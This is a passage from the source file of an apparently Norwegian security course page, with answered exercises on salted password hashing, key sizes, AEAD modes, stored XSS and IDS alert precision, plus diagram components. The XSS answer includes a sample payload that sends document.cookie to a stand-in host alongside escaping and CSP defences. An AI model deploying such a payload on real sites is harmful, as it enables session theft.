              <strong>Forsvar:</strong> per-bruker <strong>salt</strong> — en tilfeldig verdi
              (typisk 16 byte) som lagres sammen med hashen og er en del av input:
              <code> hash = SHA256(salt ‖ passord)</code>. Nå må angriperen lage en egen
              rainbow-table per bruker, og 500 GB × antall brukere er ikke gjennomførbart.
            </p>
            <p className="mt-2">
              <strong>Strategi 2 — brute-force per bruker:</strong> Selv med salt kan angriper prøve
              én og én bruker: for hver kandidat-passord, regn ut hash med dens salt og sammenlign.
              SHA-256 er rask — moderne GPU gjør milliarder per sekund. Et 8-tegns passord brytes på
              timer.
            </p>
            <p className="mt-2">
              <strong>Forsvar:</strong> <strong>treg KDF</strong> — bcrypt, scrypt, argon2id. Disse
              er bevisst designet til å være tunge (10-100 ms per hash), minne-bundne (vanskelig å
              parallellisere på GPU/ASIC). Med argon2id à 100 ms tar samme brute-force fra timer til
              hundretusenvis av år.
            </p>
            <p className="mt-2 text-muted-foreground">
              Salt løser rainbow-table; treg KDF løser brute-force. Begge må til samtidig.
              SHA-256-alene er ikke et passord-hash, og var aldri ment som det.
            </p>
          </>
        }
      />

      <Exercise
        question="Bedriften vurderer å erstatte sine ECDSA-sertifikater (256-bit) med RSA-3072. En leverandør hevder RSA er «tryggere fordi nøklene er lengre». Argumenter for eller imot, og estimer kostnaden i handshake-bytes og signering-tid."
        hint="Hva er sikkerhets-nivået i bits for hver, og hva er størrelsen på en signatur?"
        answer={
          <>
            <p>
              Leverandørens argument er feil. Sikkerhets-nivået måles i <em>brute-force-bit</em>,
              ikke nøkkel-lengde. 256-bit ECDSA gir ca. 128-bit sikkerhetsnivå (best kjente angrep
              er Pollard rho, sqrt-tid). RSA-3072 gir også ca. 128-bit sikkerhet (general number
              field sieve). De er ekvivalente.
            </p>
            <p className="mt-2">
              <strong>Kostnad i handshake-bytes:</strong> Et RSA-3072 sertifikat har offentlig
              nøkkel på 384 byte, signatur 384 byte. ECDSA-P256 har 64 byte nøkkel, 64 byte
              signatur. Et sertifikat-kjede på 3 sertifikater: RSA gir ca. 1.2 KB ekstra per
              handshake mot ECDSA. På mobile nett med pakke-tap er det merkbart.
            </p>
            <p className="mt-2">
              <strong>Signering-tid:</strong> RSA-3072 signering tar ca. 2-5 ms på moderne CPU;
              ECDSA-P256 ca. 0.1 ms. Servere som gjør tusenvis av TLS-handshakes per sekund vil
              merke 20-50x forskjell. RSA-verifikasjon er derimot rask (~0.1 ms) fordi den bruker
              liten eksponent.
            </p>
            <p className="mt-2 text-muted-foreground">
              Konklusjon: behold ECDSA (eller Ed25519 for nyere systemer). RSA-3072 er ikke
              «tryggere» — bare større og tregere. Eneste reelle grunn til å velge RSA er
              kompatibilitet med eldre klienter som ikke støtter ECDSA.
            </p>
          </>
        }
      />

      <Exercise
        question="Du designer et meldings-system og lurer på om du skal velge AES-CBC + HMAC eller AES-GCM. Begge gir konfidensialitet og integritet. Hva er de viktigste forskjellene, og hvilken anbefaler du?"
        hint="Tenk på hva som kan gå galt i implementasjonen, og hvilken rekkefølge av kryptering og MAC som er trygg."
        answer={
          <>
            <p>
              <strong>AES-CBC + HMAC</strong> krever to nøkler (én for kryptering, én for MAC), en
              uforutsigbar IV per melding, og kritisk: riktig rekkefølge. Encrypt-then-MAC er
              beviselig riktig; MAC-then-encrypt (slik SSL/TLS gjorde det) skapte angrep som POODLE
              og Lucky-13 fordi feilmeldinger fra padding-sjekk lekket informasjon (padding oracle).
              Implementasjonen må også være konstant-tid i MAC-sammenligningen.
            </p>
            <p className="mt-2">
              <strong>AES-GCM</strong> er én primitiv (AEAD) som gjør kryptering OG autentisering i
              én operasjon. Én nøkkel, én nonce. Implementasjonen kan ikke «velge feil rekkefølge» —
              det er ingen rekkefølge å velge. Hardware-akselerert (AES-NI + PCLMULQDQ) på alle
              moderne CPU-er.
            </p>
            <p className="mt-2">
              <strong>GCM-fotfellen:</strong> hvis (nøkkel, nonce) gjenbrukes er det katastrofalt —
              autentisering brytes og klartekst-XOR kan leses. Med 96-bits nonce er tilfeldig
              kollisjon trygt opp til ca. 2^32 meldinger per nøkkel. For større volum, bruk
              telle-basert nonce eller XChaCha20-Poly1305 med 192-bits nonce.
            </p>
            <p className="mt-2 text-muted-foreground">
              <strong>Anbefaling:</strong> AES-GCM (eller ChaCha20-Poly1305 hvis du ikke har
              AES-hardware). AEAD-modi lukker hele klasser av implementasjons-feil. CBC + HMAC
              eksisterer i dag bare for legacy-systemer.
            </p>
          </>
        }
      />

      <Exercise
        question="En webapp viser brukerens kallenavn på siden slik: <p>Hei, ${'{'}<i>user.name</i>{'}'}!</p> der user.name kommer fra registrering. Identifiser XSS-typen, gi en angreps-payload, og forklar både escape- og CSP-forsvar."
        hint="Hva slags input bryter ut av <p>-konteksten?"
        answer={
          <>
            <p>
              Dette er <strong>stored XSS</strong>: kallenavnet lagres i databasen og leveres ut
              hver gang noen leser siden. Angreps-payload: angriperen registrerer seg med kallenavn{" "}
              <code>{'<script>fetch("https://evil.example/?c="+document.cookie)</script>'}</code>.
              Hver fremtidig besøkende eksekverer det og lekker sin sesjons-cookie.
            </p>
            <p className="mt-2">
              <strong>Forsvar 1 — kontekst-bevisst escape:</strong> server-side templating må
              HTML-escape variabler i HTML-kontekst:
              <code> &lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>,{" "}
              <code>&quot;</code> → <code>&amp;quot;</code>, <code>&amp;</code> →{" "}
              <code>&amp;amp;</code>. De fleste templating-engines (Jinja, ERB, JSX) gjør dette by
              default på interpolasjon. Du må aktivt skru det av (eks.{" "}
              <code>{"{{ x | safe }}"}</code>) for å være sårbar.
            </p>
            <p className="mt-2">
              <strong>Forsvar 2 — Content-Security-Policy:</strong> server sender header
              <code> Content-Security-Policy: default-src 'self'; script-src 'self'</code>. Selv om
              et skript-tag SKULLE havne i HTML, nekter nettleseren å eksekvere det fordi det er
              inline. Krever at all egen JS er i eksterne filer eller har en nonce.
            </p>
            <p className="mt-2 text-muted-foreground">
              <strong>Defense in depth:</strong> bruk begge. Escape stopper det meste; CSP er et
              sikkerhetsnett som demper konsekvensene hvis escape glipper et sted i kodebasen. Sett
              også HttpOnly på sesjons-cookies så <code>document.cookie</code> ikke avslører dem til
              JS i utgangspunktet.
            </p>
          </>
        }
      />

      <Exercise
        question="En IDS overvåker 10 Gbps trafikk. Hver pakke har 0.001 % sjanse for å være ondsinnet. Detektoren har 99.5 % sensitivitet (true-positive-rate) og 0.05 % false-positive-rate. Hva er presisjonen av en alarm — altså sannsynligheten for at en alarm faktisk er et angrep? Hva forteller resultatet om driftspraksis?"
        hint="Bayes' setning. Beregn først forventet antall pakker av hver type per sekund."
        answer={
          <>
            <p>Anta gjennomsnittlig pakke-størrelse 1000 bit → 10^7 pakker/sek på 10 Gbps.</p>
            <ul className="list-disc pl-5 mt-1 space-y-1">
              <li>Ondsinnede pakker: 10^7 × 0.00001 = 100/sek</li>
              <li>Godartede pakker: 10^7 × 0.99999 ≈ 10^7/sek</li>
              <li>True positives: 100 × 0.995 = 99.5/sek</li>
              <li>False positives: 10^7 × 0.0005 = 5000/sek</li>
              <li>Totale alarmer: 5099.5/sek</li>
            </ul>
            <p className="mt-2">
              Presisjon = TP / (TP + FP) = 99.5 / 5099.5 ≈ <strong>1.95 %</strong>. Bare ca. 2 av
              hundre alarmer er ekte angrep. Operatøren drukner i støy.
            </p>
            <p className="mt-2 text-muted-foreground">
              <strong>Driftspraksis:</strong> (1) Reduser FPR ved å tune regler aggressivt — selv en
              halvering av FPR til 0.025 % dobler presisjonen. (2) Korreler over flere kilder
              (SIEM): «alarm fra IDS + uvanlig DNS-oppslag fra samme host + login fra ukjent land»
              har mye høyere posterior. (3) Bruk EDR for å hente kontekst per host. (4) Aksepter at
              ren signatur-IDS på rå pakke-strøm har en gulvgrense — derfor er moderne SOC-er bygd
              på korrelering, ikke enkelt-alarmer.
            </p>
          </>
        }
      />
    </article>
  );
}

// ============================================================
// Felles
// ============================================================

function Header({ num, title }: { num: string; title: string }) {
  return (
    <div>
      <div className="text-[10px] uppercase tracking-wider text-brand font-semibold">
        Seksjon {num}
      </div>
      <h2 className="text-lg font-semibold">{title}</h2>
    </div>
  );
}

function Defs({ items }: { items: { term: string; body: React.ReactNode }[] }) {
  return (
    <div className="rounded-xl border border-border bg-card p-4">
      <h3 className="text-xs uppercase tracking-wider text-muted-foreground mb-3">Definisjoner</h3>
      <dl className="space-y-3 text-[13px]">
        {items.map((it) => (
          <div key={it.term}>
            <dt className="font-semibold text-foreground">{it.term}</dt>
            <dd className="text-muted-foreground mt-0.5">{it.body}</dd>
          </div>
        ))}
      </dl>
    </div>
  );
}

function Illustration({ caption, children }: { caption: string; children: React.ReactNode }) {
  return (
    <figure className="rounded-xl border border-border bg-card p-4">
      <div className="rounded bg-muted/20 p-3">{children}</div>
      <figcaption className="text-xs text-muted-foreground mt-2 text-center italic">
        {caption}
      </figcaption>
    </figure>
  );
}

function Example({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-amber-500/30 bg-amber-500/5 p-4">
      <div className="text-[10px] uppercase tracking-wider text-amber-700 dark:text-amber-400 font-semibold mb-1">
        Eksempel
      </div>
      <div className="font-semibold text-foreground mb-1">{title}</div>
      <div className="text-muted-foreground text-[13px] space-y-2">{children}</div>
    </div>
  );
}

function Exercise({
  question,
  hint,
  answer,
}: {
  question: React.ReactNode;
  hint?: React.ReactNode;
  answer?: React.ReactNode;
}) {
  const [showHint, setShowHint] = useState(false);
  const [showAnswer, setShowAnswer] = useState(false);
  return (
    <div className="rounded-xl border border-brand/30 bg-brand/5 p-4">
      <div className="text-[10px] uppercase tracking-wider text-brand font-semibold mb-1">
        Oppgave
      </div>
      <div className="text-[13px]">{question}</div>
      <div className="mt-2 flex gap-2 flex-wrap">
        {hint && (
          <button
            onClick={() => setShowHint((v) => !v)}
            className="inline-flex items-center gap-1 text-[11px] text-muted-foreground hover:text-foreground"
          >
            {showHint ? <ChevronDown className="h-3 w-3" /> : <ChevronRight className="h-3 w-3" />}
            Hint
          </button>
        )}
        {answer && (
          <button
            onClick={() => setShowAnswer((v) => !v)}
            className="inline-flex items-center gap-1 text-[11px] text-muted-foreground hover:text-foreground"
          >
            {showAnswer ? (
              <ChevronDown className="h-3 w-3" />
            ) : (
              <ChevronRight className="h-3 w-3" />
            )}
            {showAnswer ? "Skjul svar" : "Vis svar"}
          </button>
        )}
      </div>
      {showHint && hint && (
        <div className="mt-2 rounded border border-border bg-background p-2 text-[12px] text-muted-foreground">
          {hint}
        </div>
      )}
      {showAnswer && answer && (
        <div className="mt-2 rounded border border-success/30 bg-success/5 p-2 text-[12px]">
          {answer}
        </div>
      )}
    </div>
  );
}

function Hvorfor({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-sky-500/30 bg-sky-500/5 p-4">
      <div className="text-[10px] uppercase tracking-wider text-sky-700 dark:text-sky-400 font-semibold mb-1">
        Hvorfor?
      </div>
      <div className="font-semibold text-foreground mb-1">{title}</div>
      <div className="text-muted-foreground text-[13px] space-y-2">{children}</div>
    </div>
  );
}

function RelatedSlugs({ slugs }: { slugs: string[] }) {
  return (
    <div className="rounded-xl border border-border bg-card p-3">
      <div className="text-[10px] uppercase tracking-wider text-muted-foreground mb-2">
        Interaktive utdypninger
      </div>
      <ul className="space-y-1 text-xs">
        {slugs.map((s) => (
          <li key={s}>
            <a
              href={`/stack/${s}`}
              className="inline-flex items-center gap-1 text-muted-foreground hover:text-brand"
            >
              <ExternalLink className="h-3 w-3" /> /stack/{s}
            </a>
          </li>
        ))}
      </ul>
    </div>
  );
}

// ============================================================
// SVG-illustrasjoner — alle original-tegnet
// ============================================================

function FourGoalsSvg() {
  const goals = [
    { x: 80, label: "Konfidensialitet", sub: "Bare A og B leser", color: "fill-brand" },
    { x: 200, label: "Integritet", sub: "Ingen endring", color: "fill-success" },
    { x: 320, label: "Autentisering", sub: "Du er den du sier", color: "fill-amber-500" },
    { x: 440, label: "Tilgjengelighet", sub: "Tjenesten lever", color: "fill-destructive" },
  ];
  return (
    <svg viewBox="0 0 520 200" className="w-full h-auto">
      <text
        x={260}
        y={20}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Fire mål for sikker kommunikasjon
      </text>
      {goals.map((g) => (
        <g key={g.label}>
          <circle
            cx={g.x}
            cy={90}
            r={36}
            className={`${g.color}/20 stroke-current`}
            strokeWidth={1.5}
          />
          <circle cx={g.x} cy={90} r={8} className={g.color} />
          <text
            x={g.x}
            y={150}
            textAnchor="middle"
            className="fill-foreground text-[10px] font-semibold"
          >
            {g.label}
          </text>
          <text x={g.x} y={165} textAnchor="middle" className="fill-muted-foreground text-[8px]">
            {g.sub}
          </text>
        </g>
      ))}
      <text x={260} y={190} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Hvert mål krever en egen mekanisme — ingen verktøy dekker alle fire
      </text>
    </svg>
  );
}

function SymVsAsymSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      {/* Sym */}
      <text
        x={130}
        y={18}
        textAnchor="middle"
        className="fill-brand text-[11px] uppercase tracking-wider font-semibold"
      >
        Symmetrisk
      </text>
      <circle cx={50} cy={70} r={14} className="fill-amber-500" />
      <text x={50} y={75} textAnchor="middle" className="fill-foreground text-[10px]">
        A
      </text>
      <circle cx={210} cy={70} r={14} className="fill-success" />
      <text x={210} y={75} textAnchor="middle" className="fill-foreground text-[10px]">
        B
      </text>
      <rect x={40} y={100} width={20} height={14} rx={2} className="fill-brand" />
      <rect x={200} y={100} width={20} height={14} rx={2} className="fill-brand" />
      <text x={50} y={130} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        K
      </text>
      <text x={210} y={130} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        K (samme)
      </text>
      <line
        x1={64}
        y1={70}
        x2={196}
        y2={70}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        strokeDasharray="2 2"
      />
      <rect
        x={115}
        y={55}
        width={30}
        height={20}
        className="fill-brand/40 stroke-brand"
        strokeWidth={1}
      />
      <text x={130} y={68} textAnchor="middle" className="fill-foreground text-[8px]">
        cipher
      </text>
      <text x={130} y={155} textAnchor="middle" className="fill-foreground text-[9px]">
        E(K, m) = c
      </text>
      <text x={130} y={170} textAnchor="middle" className="fill-foreground text-[9px]">
        D(K, c) = m
      </text>
      <text x={130} y={195} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Problem: hvordan dele K trygt?
      </text>

      {/* Asym */}
      <line x1={270} y1={20} x2={270} y2={230} className="stroke-border" strokeWidth={1} />
      <text
        x={400}
        y={18}
        textAnchor="middle"
        className="fill-success text-[11px] uppercase tracking-wider font-semibold"
      >
        Asymmetrisk
      </text>
      <circle cx={320} cy={70} r={14} className="fill-amber-500" />
      <text x={320} y={75} textAnchor="middle" className="fill-foreground text-[10px]">
        A
      </text>
      <circle cx={480} cy={70} r={14} className="fill-success" />
      <text x={480} y={75} textAnchor="middle" className="fill-foreground text-[10px]">
        B
      </text>
      <rect x={465} y={100} width={12} height={14} rx={1} className="fill-success" />
      <rect x={480} y={100} width={12} height={14} rx={1} className="fill-destructive" />
      <text x={471} y={130} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        pubB
      </text>
      <text x={486} y={130} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        privB
      </text>
      <rect x={314} y={100} width={12} height={14} rx={1} className="fill-success" />
      <text x={320} y={130} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        pubB
      </text>
      <line
        x1={334}
        y1={70}
        x2={466}
        y2={70}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        strokeDasharray="2 2"
      />
      <rect
        x={385}
        y={55}
        width={30}
        height={20}
        className="fill-success/40 stroke-success"
        strokeWidth={1}
      />
      <text x={400} y={68} textAnchor="middle" className="fill-foreground text-[8px]">
        cipher
      </text>
      <text x={400} y={155} textAnchor="middle" className="fill-foreground text-[9px]">
        E(pubB, m) = c
      </text>
      <text x={400} y={170} textAnchor="middle" className="fill-foreground text-[9px]">
        D(privB, c) = m
      </text>
      <text x={400} y={195} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Trygt — pubB er fritt tilgjengelig
      </text>
    </svg>
  );
}

function DhSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Diffie-Hellman nøkkelutveksling
      </text>
      <circle cx={60} cy={60} r={16} className="fill-amber-500" />
      <text x={60} y={65} textAnchor="middle" className="fill-foreground text-[10px]">
        A
      </text>
      <circle cx={460} cy={60} r={16} className="fill-success" />
      <text x={460} y={65} textAnchor="middle" className="fill-foreground text-[10px]">
        B
      </text>

      <text x={60} y={95} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        privat: a
      </text>
      <text x={60} y={108} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        A = g^a mod p
      </text>

      <text x={460} y={95} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        privat: b
      </text>
      <text x={460} y={108} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        B = g^b mod p
      </text>

      <line
        x1={80}
        y1={130}
        x2={440}
        y2={130}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#arr1)"
      />
      <text x={260} y={125} textAnchor="middle" className="fill-foreground text-[10px]">
        sender A (offentlig)
      </text>
      <line
        x1={440}
        y1={155}
        x2={80}
        y2={155}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#arr1)"
      />
      <text x={260} y={170} textAnchor="middle" className="fill-foreground text-[10px]">
        sender B (offentlig)
      </text>

      <defs>
        <marker id="arr1" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-brand" />
        </marker>
      </defs>

      <rect
        x={20}
        y={185}
        width={150}
        height={40}
        rx={4}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={95} y={200} textAnchor="middle" className="fill-foreground text-[9px]">
        A regner: s = B^a mod p
      </text>
      <text x={95} y={215} textAnchor="middle" className="fill-foreground text-[9px] font-mono">
        = g^(ab) mod p
      </text>

      <rect
        x={350}
        y={185}
        width={150}
        height={40}
        rx={4}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={425} y={200} textAnchor="middle" className="fill-foreground text-[9px]">
        B regner: s = A^b mod p
      </text>
      <text x={425} y={215} textAnchor="middle" className="fill-foreground text-[9px] font-mono">
        = g^(ab) mod p
      </text>

      <text x={260} y={205} textAnchor="middle" className="fill-success text-[11px] font-semibold">
        =
      </text>
      <text x={260} y={222} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        delt hemmelighet s
      </text>
    </svg>
  );
}

function HashSvg() {
  return (
    <svg viewBox="0 0 520 200" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Hash-funksjon — vilkårlig inn, fast ut
      </text>
      {/* Inputs */}
      <rect
        x={20}
        y={40}
        width={140}
        height={20}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={90} y={54} textAnchor="middle" className="fill-foreground text-[9px]">
        "Hei verden"
      </text>
      <rect
        x={20}
        y={75}
        width={200}
        height={20}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={120} y={89} textAnchor="middle" className="fill-foreground text-[9px]">
        "Lang melding med mye tekst..."
      </text>
      <rect
        x={20}
        y={110}
        width={100}
        height={20}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={70} y={124} textAnchor="middle" className="fill-foreground text-[9px]">
        "Hei verdeM"
      </text>
      <text x={130} y={124} className="fill-destructive text-[8px]">
        ← 1 bit endret
      </text>

      {/* Hash box */}
      <rect
        x={235}
        y={60}
        width={70}
        height={70}
        rx={5}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={2}
      />
      <text
        x={270}
        y={92}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        SHA-256
      </text>
      <text x={270} y={106} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        h(x)
      </text>

      {/* Arrows */}
      <line
        x1={160}
        y1={50}
        x2={235}
        y2={80}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />
      <line
        x1={220}
        y1={85}
        x2={235}
        y2={92}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />
      <line
        x1={120}
        y1={120}
        x2={235}
        y2={110}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />

      <defs>
        <marker id="harr" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>

      {/* Outputs */}
      <line
        x1={305}
        y1={75}
        x2={355}
        y2={45}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />
      <line
        x1={305}
        y1={95}
        x2={355}
        y2={85}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />
      <line
        x1={305}
        y1={115}
        x2={355}
        y2={125}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />

      <rect
        x={355}
        y={35}
        width={150}
        height={20}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={430} y={49} textAnchor="middle" className="fill-foreground text-[8px] font-mono">
        a3c1...7e9b
      </text>
      <rect
        x={355}
        y={75}
        width={150}
        height={20}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={430} y={89} textAnchor="middle" className="fill-foreground text-[8px] font-mono">
        9f02...c41a
      </text>
      <rect
        x={355}
        y={115}
        width={150}
        height={20}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={430} y={129} textAnchor="middle" className="fill-foreground text-[8px] font-mono">
        12d8...0e7f
      </text>

      <text x={260} y={170} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Selv 1 bit endret input → helt annerledes hash (avalanche-effekt)
      </text>
    </svg>
  );
}

function HmacSvg() {
  return (
    <svg viewBox="0 0 520 200" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        HMAC — hash kombinert med delt nøkkel
      </text>

      <rect
        x={30}
        y={50}
        width={70}
        height={28}
        rx={3}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={65} y={68} textAnchor="middle" className="fill-foreground text-[9px]">
        melding m
      </text>

      <rect
        x={30}
        y={95}
        width={70}
        height={28}
        rx={3}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={65} y={113} textAnchor="middle" className="fill-foreground text-[9px]">
        nøkkel K
      </text>

      <line
        x1={100}
        y1={64}
        x2={170}
        y2={85}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#hm)"
      />
      <line
        x1={100}
        y1={109}
        x2={170}
        y2={90}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#hm)"
      />

      <defs>
        <marker id="hm" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>

      <rect
        x={170}
        y={70}
        width={130}
        height={50}
        rx={5}
        className="fill-success/20 stroke-success"
        strokeWidth={2}
      />
      <text
        x={235}
        y={90}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        HMAC-SHA256
      </text>
      <text x={235} y={105} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        (K ⊕ opad ‖ h(K ⊕ ipad ‖ m))
      </text>

      <line
        x1={300}
        y1={95}
        x2={360}
        y2={95}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        markerEnd="url(#hm)"
      />

      <rect
        x={365}
        y={75}
        width={130}
        height={40}
        rx={5}
        className="fill-card stroke-success/60"
        strokeWidth={1.5}
      />
      <text x={430} y={92} textAnchor="middle" className="fill-foreground text-[9px]">
        tag t
      </text>
      <text x={430} y={106} textAnchor="middle" className="fill-foreground text-[8px] font-mono">
        3f9c...e1d2
      </text>

      <text x={260} y={155} textAnchor="middle" className="fill-foreground text-[10px]">
        Send (m, t). Mottaker med samme K kan regne ut t og sammenligne.
      </text>
      <text x={260} y={172} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Uten K kan Trudy ikke generere gyldig t for et forfalsket m.
      </text>
    </svg>
  );
}

function ChallengeResponseSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Challenge-response med signatur
      </text>
      <circle cx={70} cy={60} r={18} className="fill-amber-500" />
      <text x={70} y={66} textAnchor="middle" className="fill-foreground text-[11px]">
        A
      </text>
      <circle cx={450} cy={60} r={18} className="fill-success" />
      <text x={450} y={66} textAnchor="middle" className="fill-foreground text-[11px]">
        B
      </text>

      <line
        x1={90}
        y1={95}
        x2={430}
        y2={95}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#cr1)"
      />
      <text x={260} y={90} textAnchor="middle" className="fill-foreground text-[10px]">
        «Jeg er Alice»
      </text>

      <line
        x1={430}
        y1={130}
        x2={90}
        y2={130}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#cr1)"
      />
      <text x={260} y={125} textAnchor="middle" className="fill-foreground text-[10px]">
        nonce R (tilfeldig, 128 bit)
      </text>

      <line
        x1={90}
        y1={170}
        x2={430}
        y2={170}
        className="stroke-success"
        strokeWidth={2}
        markerEnd="url(#cr2)"
      />
      <text
        x={260}
        y={165}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        sign(privA, R)
      </text>

      <defs>
        <marker id="cr1" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-brand" />
        </marker>
        <marker id="cr2" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-success" />
        </marker>
      </defs>

      <rect
        x={350}
        y={195}
        width={140}
        height={30}
        rx={4}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={420} y={208} textAnchor="middle" className="fill-foreground text-[9px]">
        B verifiserer med pubA
      </text>
      <text x={420} y={220} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        → R passet → det er Alice
      </text>
    </svg>
  );
}

function PkiSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Tillits-kjede i PKI
      </text>

      <rect
        x={210}
        y={35}
        width={100}
        height={40}
        rx={6}
        className="fill-brand/30 stroke-brand"
        strokeWidth={2}
      />
      <text
        x={260}
        y={52}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        Rot-CA
      </text>
      <text x={260} y={66} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        i nettleser fra fabrikken
      </text>

      <line
        x1={260}
        y1={75}
        x2={150}
        y2={120}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />
      <line
        x1={260}
        y1={75}
        x2={370}
        y2={120}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />

      <rect
        x={90}
        y={120}
        width={120}
        height={36}
        rx={5}
        className="fill-success/20 stroke-success"
        strokeWidth={1.5}
      />
      <text
        x={150}
        y={135}
        textAnchor="middle"
        className="fill-foreground text-[9px] font-semibold"
      >
        Mellom-CA #1
      </text>
      <text x={150} y={148} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        signert av rot
      </text>

      <rect
        x={310}
        y={120}
        width={120}
        height={36}
        rx={5}
        className="fill-success/20 stroke-success"
        strokeWidth={1.5}
      />
      <text
        x={370}
        y={135}
        textAnchor="middle"
        className="fill-foreground text-[9px] font-semibold"
      >
        Mellom-CA #2
      </text>
      <text x={370} y={148} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        signert av rot
      </text>

      <line
        x1={150}
        y1={156}
        x2={80}
        y2={195}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />
      <line
        x1={150}
        y1={156}
        x2={220}
        y2={195}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />
      <line
        x1={370}
        y1={156}
        x2={380}
        y2={195}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />

      <rect
        x={30}
        y={195}
        width={100}
        height={30}
        rx={4}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={80} y={208} textAnchor="middle" className="fill-foreground text-[9px]">
        vg.no
      </text>
      <text x={80} y={219} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        sertifikat
      </text>

      <rect
        x={170}
        y={195}
        width={100}
        height={30}
        rx={4}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={220} y={208} textAnchor="middle" className="fill-foreground text-[9px]">
        nrk.no
      </text>
      <text x={220} y={219} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        sertifikat
      </text>

      <rect
        x={330}
        y={195}
        width={100}
        height={30}
        rx={4}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={380} y={208} textAnchor="middle" className="fill-foreground text-[9px]">
